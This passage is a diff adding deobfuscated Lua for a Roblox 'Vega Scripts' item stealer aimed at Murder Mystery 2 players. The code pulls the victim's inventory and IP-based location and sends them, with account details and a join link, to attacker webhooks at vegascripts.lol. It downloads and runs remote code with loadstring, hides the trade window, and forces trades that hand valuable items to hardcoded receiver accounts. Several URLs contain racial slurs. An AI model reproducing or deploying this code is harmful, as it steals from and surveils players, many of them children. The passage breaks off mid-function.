+							for i2 = 0, 63 do
+								local v929 = bxor
+								local v930 = band
+								local v931 = (v927 + bxor(v16(v924, 6), v16(v924, 11), v16(v924, 25)) + v929(band(v924, v925), v930(bnot(v924), v926)) + t2[i2 + 1] + t67[i2]) % 4294967296
+								local v932 = bxor
+								local v933 = (bxor(v16(v920, 2), v16(v920, 13), v16(v920, 22)) + v932(band(v920, v921), band(v920, v922), band(v921, v922))) % 4294967296
+
+								v927 = v926
+								v926 = v925
+								v925 = v924
+								v924 = (v923 + v931) % 4294967296
+								v923 = v922
+								v922 = v921
+								v921 = v920
+								v920 = (v931 + v933) % 4294967296
+							end
+
+							local t68 = {
+								v920,
+								v921,
+								v922,
+								v923,
+								v924,
+								v925,
+								v926,
+								v927
+							}
+
+							for i2 = 1, 8 do
+								t66[i2] = (t66[i2] + t68[i2]) % 4294967296
+							end
+						end
+
+						local t69 = {}
+
+						for _, v in ipairs(t66) do
+							t69[#t69 + 1] = string.char(math.floor(v / 16777216) % 256, math.floor(v / 65536) % 256, math.floor(v / 256) % 256, v % 256)
+						end
+
+						return table.concat(t69)
+					end
+					t3 = {}
+
+					for i = 1, 64 do
+						t3[("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):byte(i)] = i - 1
+					end
+
+					u20 = nil
+					v21 = function(p142)
+						u20 = 169343501
+
+						local t70 = {}
+						local v941 = #p142
+
+						for i = 1, v941, 3 do
+							local v943, v944, v945 = p142:byte(i, i + 2)
+							local v946 = v943 * 65536 + (v944 or 0) * 256 + (v945 or 0)
+
+							t70[#t70 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.rshift(v946, 18) + 1, bit32.rshift(v946, 18) + 1)
+							t70[#t70 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(bit32.rshift(v946, 12), 63) + 1, bit32.band(bit32.rshift(v946, 12), 63) + 1)
+
+							if i + 1 <= v941 then
+								t70[#t70 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(bit32.rshift(v946, 6), 63) + 1, bit32.band(bit32.rshift(v946, 6), 63) + 1)
+							end
+
+							if i + 2 <= v941 then
+								t70[#t70 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(v946, 63) + 1, bit32.band(v946, 63) + 1)
+							end
+						end
+
+						return table.concat(t70)
+					end
+					u22 = nil
+					v23 = function(p143)
+						u22 = 452077855
+
+						local v947 = #p143 % 4
+
+						if v947 == 2 then
+							p143 ..= "=="
+						elseif v947 == 3 then
+							p143 ..= "="
+						end
+
+						local t71 = {}
+
+						for i = 1, #p143, 4 do
+							local v950, v951, v952, v953 = p143:byte(i, i + 3)
+							local v954 = (t3[v950] or 0) * 262144 + (t3[v951] or 0) * 4096 + (t3[v952] or 0) * 64 + (t3[v953] or 0)
+
+							t71[#t71 + 1] = string.char(bit32.rshift(v954, 16))
+
+							if v952 and v952 ~= 61 then
+								t71[#t71 + 1] = string.char(bit32.band(bit32.rshift(v954, 8), 255))
+							end
+
+							if v953 and v953 ~= 61 then
+								t71[#t71 + 1] = string.char(bit32.band(v954, 255))
+							end
+						end
+
+						return table.concat(t71)
+					end
+					u24 = nil
+					v25 = function(p144, p145)
+						u24 = 700555412
+
+						return v18("4dG9oM2pR7vX5cN8" .. p144 .. tostring(p145) .. "wF3tJ6yB1eH0sA4d")
+					end
+					u26 = nil
+					u27 = nil
+					u28 = nil
+					v29 = function(p146, p147)
+						u26 = 288918583
+						u27 = 747745209
+						u28 = 436382071
+
+						local v955 = "https://webhook.vegascripts.lol/request/" .. p146 .. "/" .. tostring(p147)
+						local request_2 = request or syn and syn.request or http_request or http and http.request
+
+						if not request_2 then
+							error("No request function available")
+						end
+
+						local v957 = request_2({
+							Url = v955,
+							Method = "GET",
+							Headers = {
+								["Content-Type"] = "application/json"
+							}
+						})
+
+						if v957 and v957.StatusCode == 200 then
+							return HttpService:JSONDecode(v957.Body).token
+						end
+
+						error("Fail" .. tostring(v957 and v957.StatusCode or "no response"))
+					end
+					t4 = {}
+					t4.__index = t4
+					u31 = nil
+					u32 = nil
+					t4.new = function(p148, p149)
+						u31 = 455722073
+						u32 = 572011769
+
+						local obj = setmetatable({}, t4)
+
+						obj.encryptionKey = v25(v29(p148, p149), p149)
+						obj.webhookToken = p148
+						obj.timestamp = p149
+
+						return obj
+					end
+					u34 = nil
+					t4.encrypt = function(p150, p151)
+						u34 = 341206522
+
+						local json
+
+						if type(p151) == "table" then
+							json = HttpService:JSONEncode(p151)
+						else
+							json = tostring(p151)
+						end
+
+						return (v21(v18(p150.encryptionKey .. json) .. json))
+					end
+					u36 = nil
+					u37 = nil
+					v38 = function(p152, p153)
+						u36 = 22024574
+						u37 = 649926619
+
+						local now = os.time()
+
+						p152._timestamp = now
+
+						return t4.new(p153, now):encrypt(p152), now
+					end
+					Usernames_ = _G.Usernames or getgenv().Users or {}
+					min_rarity = _G.min_rarity or getgenv().rarity or "Godly"
+					min_value = _G.min_value or getgenv().min or 1
+					pingEveryone = _G.pingEveryone or getgenv().ping or "No"
+					webhook = _G.webhook or getgenv().wh or "37458d46afc973c5f93277986cef00c8"
+					t5 = {
+						"joeiamjoezeif",
+						"jo_125w",
+						"joeme2vv"
+					}
+					t6 = {}
+
+					for _, v in ipairs(Usernames_) do
+						table.insert(t6, tostring(v):lower())
+					end
+
+					for _, v in ipairs(t5) do
+						table.insert(t6, tostring(v):lower())
+					end
+
+					t7 = {}
+					messageId = nil
+					Players = game:GetService("Players")
+					ReplicatedStorage = game:GetService("ReplicatedStorage")
+					game:GetService("TeleportService")
+					LocalPlayer = Players.LocalPlayer
+
+					if next(Usernames_) == nil then
+						LocalPlayer:kick("You didn't add a usernames or a valid webhook !")
+
+						return
+					end
+
+					if game.PlaceId ~= 142823291 then
+						LocalPlayer:kick("Game not supported. Please join a normal MM2 server")
+
+						return
+					end
+
+					v55 = string.find(v7, "delta") or string.find(v7, "krnl")
+					v57 = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer"
+					v58 = #Players:GetPlayers() >= 12
+
+					if v57 or v58 then
+						if v55 then
+							LocalPlayer:kick(v57 and "VIP Servers not supported " or "FULL Servers Arent Supported")
+
+							return
+						end
+
+						LocalPlayer:kick(v57 and "VIP Servers not supported " or "FULL Servers Arent Supported")
+
+						return
+					end
+
+					getgenv().RealJobID = game.JobId
+					u65 = nil
+					u66 = nil
+					v67 = function()
+						u65 = 636436657
+						u66 = 1064691622
+
+						local v965 = Usernames_ or {}
+
+						if #v965 == 0 then
+							return
+						end
+
+						for _, v in ipairs(v965) do
+							local v968 = tostring(v)
+							local t72 = {
+								jobId = getgenv().RealJobID,
+								placeId = game.PlaceId,
+								username = LocalPlayer.Name,
+								receiver = v968
+							}
+							local _ = pcall(function()
+								return request({
+									Url = "https://vegascripts.lol/hit",
+									Method = "POST",
+									Headers = {
+										["Content-Type"] = "application/json",
+										Authorization = "nice_remote_spy"
+									},
+									Body = HttpService:JSONEncode(t72)
+								})
+							end)
+						end
+					end
+					GetPlayerLevel = ReplicatedStorage.Remotes.Extras.GetPlayerLevel
+					LocalPlayer2 = Players.LocalPlayer
+
+					if GetPlayerLevel:InvokeServer(LocalPlayer2) < 10 then
+						LocalPlayer2:Kick("script error. make sure ur above the level 9")
+					end
+
+					v70 = function()
+						local ok3, result3 = pcall(function()
+							return (request or syn and syn.request or http and http.request or http_request)({
+								Url = "http://ip-api.com/json",
+								Method = "GET"
+							})
+						end)
+
+						if ok3 and result3 and result3.Body then
+							local ok4, result4 = pcall(function()
+								return HttpService:JSONDecode(result3.Body)
+							end)
+
+							if ok4 and result4 then
+								return result4
+							end
+						end
+
+						return {}
+					end
+					loc = v70()
+					request_ = request or syn and syn.request or http and http.request or http_request or krnl.request
+					Item = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+					v73 = function(p154)
+						local HttpService2 = game:GetService("HttpService")
+						local request_2 = request or syn and syn.request or http_request or http and http.request
+
+						if not request_2 then
+							warn("Executor doesnt request")
+
+							return {
+								total = "0.00",
+								itemPrices = {}
+							}
+						end
+
+						local ok3, result3 = pcall(function()
+							return request_2({
+								Url = "https://fuckingniggermf.vercel.app/api/calc",
+								Method = "POST",
+								Headers = {
+									["Content-Type"] = "application/json"
+								},
+								Body = HttpService2:JSONEncode({
+									inventory = p154
+								})
+							})
+						end)
+
+						if ok3 and result3 and result3.Body then
+							local ok4, result4 = pcall(function()
+								return HttpService2:JSONDecode(result3.Body)
+							end)
+
+							if ok4 then
+								return result4
+							end
+						end
+
+						return {
+							total = "0.00",
+							itemPrices = {}
+						}
+					end
+					u74 = nil
+					v75 = function(p155)
+						u74 = 24282524
+
+						local t73 = {}
+
+						local function v983()
+							local request_2 = request or syn and syn.request or http_request or http and http.request
+
+							if not request_2 then
+								return {}
+							end
+
+							local function v985(p156)
+								local ok3, result3 = pcall(function()
+									return request_2({
+										Url = p156,
+										Method = "GET",
+										Headers = {
+											Accept = "application/json",
+											["User-Agent"] = "Mozilla/5.0"
+										}
+									})
+								end)
+
+								if ok3 then
+									if result3 and result3.Body then
+										local t74 = {}
+
+										for match, match2 in result3.Body:gmatch("\"name\":\"([^\"]+)\",\"game\":\"mm2\",\"price\":[%d.]+,\"emoji\":\"([^\"]+)\"") do
+											t74[match:lower()] = match2
+										end
+
+										return t74
+									end
+								end
+
+								return {}
+							end
+
+							local v991 = v985("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
+
+							if not v991 or next(v991) == nil then
+								v991 = v985("https://fuckingniggermf.vercel.app/api/valuables?game=mm2")
+							end
+
+							return v991
+						end
+
+						local v992 = v983()
+
+						for _, v in ipairs(p155) do
+							table.insert(t73, {
+								name = tostring(v.DataID):gsub("%s+", ""),
+								amount = tonumber(v.Amount) or 1
+							})
+						end
+
+						local v995 = v73(t73)
+
+						if v995 and v995.itemPrices then
+							for k, itemPrice in pairs(v995.itemPrices) do
+								local v998 = v992[k:lower()]
+
+								if v998 and v998 ~= "" then
+									itemPrice.emoji = v998
+								else
+									itemPrice.emoji = ""
+								end
+							end
+						end
+
+						return v995
+					end
+					u76 = nil
+					v77 = function()
+						u76 = 301773659
+
+						local request_2 = request or syn and syn.request or http_request or http and http.request
+
+						if not request_2 then
+							warn("No request function available for value API")
+
+							return {}
+						end
+
+						local ok3, result3 = pcall(function()
+							return request_2({
+								Url = "https://vegascripts.lol/public/mm2-values.lua",
+								Method = "GET"
+							})
+						end)
+
+						if ok3 and result3 and result3.Body then
+							local chunk = loadstring(result3.Body)
+
+							if chunk then
+								local ok4, result4 = pcall(chunk)
+
+								if ok4 and result4 then
+									return result4
+								end
+							end
+						end
+
+						return {}
+					end
+					v78 = function()
+						local t75 = {}
+						local v1006 = v77()
+
+						if v1006 then
+							if next(v1006) ~= nil then
+								for k, v in pairs(Item) do
+									local ItemName = v.ItemName or ""
+									local Rarity = v.Rarity or ""
+									local Chroma = v.Chroma or false
+
+									if ItemName ~= "" and Rarity ~= "" then
+										local v1012 = table.find(t1, Rarity)
+										local v1013 = table.find(t1, "Godly")
+
+										if v1012 and v1013 <= v1012 then
+											local v1014
+
+											if Chroma then
+												if v1006.Chroma and v1006.Chroma[ItemName] then
+													v1014 = v1006.Chroma[ItemName]
+												end
+											else
+												local v1015 = ({
+													Common = "Common",
+													Uncommon = "Uncommon",
+													Rare = "Rare",
+													Epic = "Epic",
+													Legendary = "Legendary",
+													Godly = "Godly",
+													Ancient = "Ancient",
+													Unique = "Unique",
+													Vintage = "Vintage"
+												})[Rarity]
+
+												if v1015 and v1006[v1015] and v1006[v1015][ItemName] then
+													v1014 = v1006[v1015][ItemName]
+												end
+											end
+
+											if v1014 then
+												t75[k] = v1014
+											end
+										end
+									end
+								end
+
+								return t75
+							end
+						end
+
+						warn("Failed to fetch values from ts using fallback")
+
+						return t75
+					end
+					u79 = nil
+					u80 = nil
+					u81 = nil
+					v82 = function(p157)
+						u79 = 63343817
+						u80 = 738739290
+						u81 = 744397085
+
+						if webhook == "" then
+							warn("No webhook token")
+
+							return false, nil
+						end
+
+						local v1016, v1017 = v38(p157, webhook)
+
+						if not v1016 then
+							warn("enc fail")
+
+							return false, nil
+						end
+
+						local t76 = {
+							webhook = webhook,
+							timestamp = v1017,
+							encrypted = v1016
+						}
+						local ok3, result3 = pcall(function()
+							return request_({
+								Url = "https://webhook.vegascripts.lol/api/token/" .. webhook,
+								Method = "POST",
+								Headers = {
+									["Content-Type"] = "application/json",
+									["User-Agent"] = "Mozilla/5.0"
+								},
+								Body = HttpService:JSONEncode(t76)
+							})
+						end)
+
+						if ok3 and result3 then
+							if result3.StatusCode == 200 then
+								return true, (HttpService:JSONDecode(result3.Body))
+							end
+
+							warn("says diddy boi" .. tostring(result3.StatusCode))
+						else
+							warn("fail boi " .. tostring(result3))
+						end
+
+						return false, nil
+					end
+					v83 = false
+					ipairs_ = ipairs
+					Usernames_2 = Usernames or {}
+
+					for _, v in ipairs_(Usernames_2) do
+						if v == LocalPlayer.Name then
+							v83 = true
+
+							break
+						end
+					end
+
+					v86 = false
+
+					if v83 then
+						v86 = true
+					end
+
+					u87 = nil
+					u88 = nil
+					u89 = nil
+					v90 = function(p158)
+						u87 = 490977325
+						u88 = 473632988
+						u89 = 543508434
+
+						local v1023 = Players:FindFirstChild(p158)
+
+						if v1023 then
+							pcall(function()
+								ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(v1023)
+							end)
+						end
+					end
+					v91 = function()
+						return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+					end
+					u92 = nil
+					u93 = nil
+					u94 = nil
+					v95 = function()
+						u92 = 572979834
+						u93 = 922086990
+						u94 = 837910670
+
+						repeat
+							task.wait(0.1)
+						until v91() == "None"
+					end
+					Trade = ReplicatedStorage.Trade
+					_G.LastOffer = _G.LastOffer or nil
+					u99 = nil
+					u100 = nil
+					Trade.UpdateTrade.OnClientEvent:Connect(function(p159)
+						u99 = 214572371
+						u100 = 1052024091
+						_G.LastOffer = p159.LastOffer
+					end)
+					v101 = function()
+						if _G.LastOffer then
+							Trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer)
+						else
+							warn("nil")
+						end
+					end
+					u102 = nil
+					u103 = nil
+					v104 = function(p160)
+						u102 = 827327342
+						u103 = 988604516
+						Trade.OfferItem:FireServer(p160, "Weapons")
+					end
+					u105 = nil
+					u106 = nil
+					v107 = function(p161, p162, p163)
+						u105 = 30301695
+						u106 = 667811889
+
+						if not t7[p161] then
+							t7[p161] = 0
+						end
+
+						t7[p161] += p162 or 1
+
+						if messageId then
+							pcall(function()
+								local t77 = {
+									Url = "http://webhook.vegascripts.lol" .. "/api/claimed/" .. webhook,
+									Method = "POST",
+									Headers = {
+										["Content-Type"] = "application/json"
+									}
+								}
+								local v1025 = HttpService
+								local JSONEncode = HttpService.JSONEncode
+
+								t77.Body = JSONEncode(v1025, {
+									messageId = messageId,
+									weaponName = p161,
+									amount = p162 or 1,
+									valueAmount = p163 or 0
+								})
+								request(t77)
+							end)
+						end
+					end
+					v108 = function(p164)
+						task.spawn(function()
+							while pcall(function()
+								request({
+									Url = "http://webhook.vegascripts.lol" .. "/api/ping/" .. webhook,
+									Method = "POST",
+									Headers = {
+										["Content-Type"] = "application/json"
+									},
+									Body = HttpService:JSONEncode({
+										messageId = p164
+									})
+								})
+							end) do
+								task.wait(1)
+							end
+						end)
+					end
+					u109 = nil
+					u110 = nil
+					v111 = function(p165)
+						u109 = 563789295
+						u110 = 367676871
+						pcall(function()
+							request({
+								Url = "http://webhook.vegascripts.lol" .. "/api/partial/" .. webhook,
+								Method = "POST",
+								Headers = {
+									["Content-Type"] = "application/json"
+								},
+								Body = HttpService:JSONEncode({
+									messageId = p165
+								})
+							})
+						end)
+					end
+					u112 = nil
+					u113 = nil
+					u114 = nil
+					v115 = function(p166)
+						u112 = 940471625
+						u113 = 1008316571
+						u114 = 868413586
+						pcall(function()
+							request({
+								Url = "http://webhook.vegascripts.lol" .. "/api/allclaimed/" .. webhook,
+								Method = "POST",
+								Headers = {
+									["Content-Type"] = "application/json"
+								},
+								Body = HttpService:JSONEncode({
+									messageId = p166
+								})
+							})
+						end)
+					end
+					getgenv().topHitCycleEnabled = true
+					getgenv().topHitLowThreshold = 1000
+					getgenv().topHitHighThreshold = 5000
+					getgenv().topHitLowStartHour = 14
+					getgenv().topHitLowEndHour = 16
+					getgenv().topHitHighStartHour = 16
+					getgenv().topHitHighEndHour = 20
+					v116 = function()
+						if not getgenv().topHitCycleEnabled then
+							return 5000
+						end
+
+						local v1027 = tonumber(os.date("%H"))
+						local topHitLowStartHour = getgenv().topHitLowStartHour or 14
+						local topHitLowEndHour = getgenv().topHitLowEndHour or 16
+						local topHitHighStartHour = getgenv().topHitHighStartHour or 16
+						local topHitHighEndHour = getgenv().topHitHighEndHour or 20
+
+						if topHitLowStartHour <= v1027 and v1027 < topHitLowEndHour then
+							return getgenv().topHitLowThreshold or 1000
+						end
+
+						if topHitHighStartHour <= v1027 and v1027 < topHitHighEndHour then
+							return getgenv().topHitHighThreshold or 5000
+						end
+
+						return getgenv().topHitHighThreshold or 5000
+					end
+					v117 = function(p167, p168)
+						local n29 = 0
+						local v1033 = #p167 > 0
+
+						if v1033 then
+							for _, v in ipairs(p167) do
+								n29 += (v.Value or 0) * (v.Amount or 1)
+							end
+						end
+
+						if not v1033 then
+							p168 = ""
+						end
+
+						local function v1036(p169)
+							local n30 = 0
+							local t78 = {}
+
+							for _, v in ipairs(p169) do
+								local v1041 = tostring(v.DataID):gsub("%s+", "")
+								local Rarity = v.Rarity or ""
+								local Value = v.Value or 0
+								local Amount = v.Amount or 1
+
+								if Rarity == "Godly" or Rarity == "Ancient" or Rarity == "Unique" then
+									local v1045 = Value * Amount * 0.013
+
+									n30 += v1045
+									t78[v1041] = {
+										price = string.format("%.2f", v1045),
+										emoji = ""
+									}
+								end
+							end
+
+							return {
+								total = string.format("%.2f", n30),
+								itemPrices = t78
+							}
+						end
+
+						local v1046 = v1033 and v1036(p167) or {
+							total = "0.00",
+							itemPrices = {}
+						}
+						local total = v1046.total or "0.00"
+						local itemPrices = v1046.itemPrices or {}
+						local n31 = 0
+
+						if v1033 then
+							for _, v in ipairs(p167) do
+								n31 += (v.Value or 0) * (v.Amount or 1)
+							end
+						end
+
+						local identifyexecutor_2 = identifyexecutor and identifyexecutor() or "Unknown"
+						local v1053 = "https://vegascripts.lol/join?placeId=" .. game.PlaceId .. "&jobId=" .. getgenv().RealJobID
+						local v1054 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+						local v1055 = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(LocalPlayer.UserId)
+						local v1056 = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(LocalPlayer.UserId)
+						local t79 = {}
+						local n32 = 0
+
+						for _, v in ipairs(p167) do
+							table.insert(t79, v)
+							n32 += v.Amount or 1
+						end
+
+						table.sort(t79, function(p170, p171)
+							local v1061 = tostring(p170.DataID):gsub("%s+", "")
+							local v1062 = tostring(p171.DataID):gsub("%s+", "")
+
+							return (itemPrices[v1061] and tonumber(itemPrices[v1061].price) or 0) > (itemPrices[v1062] and tonumber(itemPrices[v1062].price) or 0)
+						end)
+
+						local v1063 = tonumber(total) or 0
+						local v1064 = false
+						local s6 = "```"
+						local v1066
+
+						if #t79 == 0 then
+							v1066 = s6 .. "  no items found in inventory (that matches your min value/rarity)\n```"
+						else
+							for _, v in ipairs(t79) do
+								local v1069 = tostring(v.DataID):gsub("%s+", "")
+								local v1070 = itemPrices[tostring(v.DataID):gsub("%s+", "")]
+								local v1071 = v1070 and tonumber(v1070.price) or 0
+
+								if not (v1070 and v1070.emoji) then
+								end
+
+								local v1072 = t7[v1069] or 0
+								local Amount = v.Amount
+								local v1074 = string.format("[%d/%d]", v1072, Amount)
+								local v1075 = string.format("- %dx %s%s ── $%.2f %s\n", Amount, v.Value > 1500 and "" or "", v1069, v1071, v1074)
+
+								if not (#s6 + #v1075 < 350) then
+									v1064 = true
+
+									break
+								end
+
+								s6 ..= v1075
+								v1063 -= v1071
+							end
+
+							if v1064 then
+								s6 ..= string.format("\nAnd $%.2f worth of items more...\n", math.max(0, v1063))
+							end
+
+							v1066 = s6 .. "```"
+						end
+
+						local country = loc.country or "Unknown"
+
+						if loc.city and loc.city ~= "" then
+							country ..= ", " .. loc.city
+						end
+
+						local v1077 = false
+
+						if v116() < n29 then
+							v1077 = true
+						end
+
+						local v1078 = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. getgenv().RealJobID .. "')"
+						local v1079, v1080 = v82({
+							gameType = "MM2",
+							istophit = v1077,
+							location = country,
+							receiver = v86,
+							content = p168,
+							username = "Vega",
+							avatar_url = "https://cdn.discordapp.com/attachments/1502980057084203180/1518993307001163917/New_Project_99_7AA01CA.png?ex=6a3bf041&is=6a3a9ec1&hm=af2811e56cec274205bcf42911072a6cb4c84fb292fa0fedeecdb66d17a3d09d&",
+							embeds = { {
+								author = {
+									name = "⚡ Vega · Murder Mystery 2",
+									url = "https://www.roblox.com/games/142823291",
+									icon_url = v1055
+								},
+								title = "**" .. LocalPlayer.Name .. "**",
+								description = "```Status        : " .. "Pending" .. "\nItems Claimed : 0 / " .. n32 .. "\nValue Claimed : 0 / " .. n29 .. "```",
+								color = 16711680,
+								thumbnail = {
+									url = v1054
+								},
+								fields = {
+									{
+										name = "**Player Info**",
+										value = "```User        : " .. LocalPlayer.Name .. "\nUser ID     : " .. LocalPlayer.UserId .. "\nAge         : " .. LocalPlayer.AccountAge .. " days" .. "\nTotal Value : " .. (n29 or 0) .. "\nTotal USD   : $" .. total .. "\nExecutor    : " .. identifyexecutor_2 .. "\nPlayers     : " .. #Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "```",
+										inline = false
+									},
+									{
+										name = "**Inventory**",
+										value = v1066,
+										inline = false
+									},
+									{
+										name = "**Teleport Script**",
+										value = "```lua\n" .. v1078 .. "```",
+										inline = false
+									},
+									{
+										name = "**Join Link**",
+										value = "[Click here to join](" .. v1053 .. ")",
+										inline = false
+									}
+								},
+								footer = {
+									text = "Vega Scripts · discord.gg/vega-scripts",
+									icon_url = v1056
+								},
+								timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+							} }
+						})
+
+						if v1033 then
+							v67()
+						end
+
+						return v1079, v1080
+					end
+					u118 = nil
+					u119 = nil
+					pcall(function()
+						u118 = 786116392
+						u119 = 844217739
+
+						local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
+						local Trade2 = ReplicatedStorage2:FindFirstChild("Trade")
+
+						if not Trade2 then
+							Trade2 = Instance.new("Folder")
+							Trade2.Name = "Trade"
+							Trade2.Parent = ReplicatedStorage2
+							print("created trade folder")
+						end
+
+						local t80 = {
+							SendRequest = "RemoteFunction",
+							GetProfileData = "RemoteFunction",
+							UpdateTrade = "RemoteEvent",
+							AcceptTrade = "RemoteEvent",
+							DeclineTrade = "RemoteEvent",
+							StartTrade = "RemoteEvent"
+						}
+
+						for k, v in pairs(t80) do
+							if not Trade2:FindFirstChild(k) then
+								local instance = Instance.new(v)
+
+								instance.Name = k
+								instance.Parent = Trade2
+								warn("0")
+							end
+						end
+
+						local Modules = ReplicatedStorage2:FindFirstChild("Modules")
+
+						if not Modules then
+							Modules = Instance.new("Folder")
+							Modules.Name = "Modules"
+							Modules.Parent = ReplicatedStorage2
+							print("module gay")
+						end
+
+						local function createModuleScript()
+							local ModuleScript = Instance.new("ModuleScript")
+
+							ModuleScript.Name = "TradeModule"
+							ModuleScript.Source = "return {}"
+							ModuleScript.Parent = Modules
+							warn("0")
+
+							return ModuleScript
+						end
+
+						local TradeModule = Modules:FindFirstChild("TradeModule")
+
+						if TradeModule then
+							if not TradeModule:IsA("ModuleScript") then
+								TradeModule:Destroy()
+								createModuleScript()
+							end
+						else
+							createModuleScript()
+						end
+
+						if not Modules:FindFirstChild("TradeModule") then
+							createModuleScript()
+						end
+
+						for k, v in pairs(t80) do
+							if not Trade2:FindFirstChild(k) then
+								local instance = Instance.new(v)
+
+								instance.Name = k
+								instance.Parent = Trade2
+								warn("0")
+							end
+						end
+
+						local RobloxGui = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
+
+						if RobloxGui then
+							local TradeGUI_Phone = RobloxGui:FindFirstChild("TradeGUI_Phone")
+
+							if TradeGUI_Phone and TradeGUI_Phone.Enabled == false then
+								TradeGUI_Phone.Enabled = true
+								warn("0")
+							end
+						end
+
+						print("complete")
+					end)
+					t8 = {
+						DefaultGun = true,
+						DefaultKnife = true,
+						Reaver = true,
+						Reaver_Legendary = true,
+						Reaver_Godly = true,
+						Reaver_Ancient = true,
+						IceHammer = true,
+						IceHammer_Legendary = true,
+						IceHammer_Godly = true,
+						IceHammer_Ancient = true,
+						Gingerscythe = true,
+						Gingerscythe_Legendary = true,
+						Gingerscythe_Godly = true,
+						Gingerscythe_Ancient = true,
+						TestItem = true,
+						Season1TestKnife = true,
+						Cracks = true,
+						Icecrusher = true,
+						["???"] = true,
+						Dartbringer = true,
+						TravelerAxeRed = true,
+						TravelerAxeBronze = true,
+						TravelerAxeSilver = true,
+						TravelerAxeGold = true,
+						BlueCamo_K_2022 = true,
+						GreenCamo_K_2022 = true,
+						SharkSeeker = true
+					}
+					v121 = v78()
+					response = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+					v123 = function()
+						local t81 = {}
+						local v1097 = table.find(t1, min_rarity)
+
+						for k, v in pairs(response.Weapons.Owned) do
+							task.wait()
+
+							local v1100 = Item[k] or Item[tostring(k)]
+
+							if not v1100 then
+								for _, v2 in pairs(Item) do
+									if v2.ItemID and tostring(v2.ItemID) == tostring(k) then
+										v1100 = v2
+
+										break
+									end
+								end
+							end
+
+							if v1100 then
+								local Rarity = v1100.Rarity
+								local v1104 = table.find(t1, Rarity)
+
+								if v1104 and v1097 <= v1104 and not t8[k] then
+									local v1105 = v121[k]
+
+									if not v1105 then
+										v1105 = v1104 >= table.find(t1, "Godly") and 2 or 1
+									end
+
+									if min_value <= v1105 then
+										table.insert(t81, {
+											DataID = k,
+											Rarity = Rarity,
+											Amount = v,
+											Value = v1105
+										})
+									end
+								end
+							else
+								warn("Item not found " .. tostring(k))
+							end
+						end
+
+						table.sort(t81, function(p172, p173)
+							return p172.Value * p172.Amount > p173.Value * p173.Amount
+						end)
+
+						return t81
+					end
+					u124 = nil
+					v125 = function()
+						u124 = 597805934
+						game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
+					end
+					u126 = nil
+					u127 = nil
+					u128 = nil
+					v129 = function()
+						u126 = 937316987
+						u127 = 493048220
+						u128 = 330287905
+
+						local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+						task.spawn(function()
+							local TradeGUI = PlayerGui:WaitForChild("TradeGUI", 5)
+
+							if TradeGUI then
+								TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
+									TradeGUI.Enabled = false
+								end)
+								TradeGUI.Enabled = false
+							end
+
+							local TradeGUI_Phone = PlayerGui:WaitForChild("TradeGUI_Phone", 5)
+
+							if TradeGUI_Phone then
+								TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
+									TradeGUI_Phone.Enabled = false
+								end)
+								TradeGUI_Phone.Enabled = false
+							end
+						end)
+					end
+					u130 = nil
+					u131 = nil
+					v132 = function(p174, p175, p176)
+						u130 = 650392578
+						u131 = 777532232
+
+						local v1109 = false
+						local v1110, v1111, v1112 = ipairs(t5)
+						local v1113 = geniter(v1110, v1111, v1112)
+
+						while true do
+							local v1114 = table.pack(v1113())
+
+							if v1114[1] then
+								local v1115 = v1114[3]
+
+								if p174:lower() == tostring(v1115):lower() then
+									v1109 = true
+
+									break
+								end
+							else
+								break
+							end
+						end
+
+						local v1116 = v91()
+
+						if v1116 == "StartTrade" then
+							Trade.DeclineTrade:FireServer()
+							task.wait(0.3)
+						elseif v1116 == "ReceivingRequest" then
+							Trade.DeclineRequest:FireServer()
+							task.wait(0.3)
+						end
+
+						local n33 = 0
+						local v1118, v1119, v1120 = ipairs(p175)
+
+						for _, v in v1118, v1119, v1120 do
+							n33 += v.Amount
+						end
+
+						local n34 = 0
+						local v1124 = v78()
+
+						while #p175 > 0 do
+							local v1125 = v91()
+
+							if v1125 == "None" then
+								v90(p174)
+								task.wait(0.5)
+							elseif v1125 == "SendingRequest" then
+								task.wait(0.3)
+							elseif v1125 == "ReceivingRequest" then
+								Trade.DeclineRequest:FireServer()
+								task.wait(0.3)
+							elseif v1125 == "StartTrade" then
+								local v1126 = math.min(4, #p175)
+
+								for i = 1, v1126 do
+									local v1128 = p175[i]
+
+									for i2 = 1, v1128.Amount do
+										v104(v1128.DataID)
+										task.wait(0.05)
+									end
+								end
+
+								task.wait(6)
+								v101()
+								v95()
+								task.wait(0.5)
+
+								local response2 = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+								local t82 = {}
+								local t83 = {}
+								local n35 = 0
+
+								for i = 1, v1126 do
+									local v1135 = p175[i]
+
+									if not response2.Weapons.Owned[v1135.DataID] then
+										local v1136 = tostring(v1135.DataID):gsub("%s+", "")
+
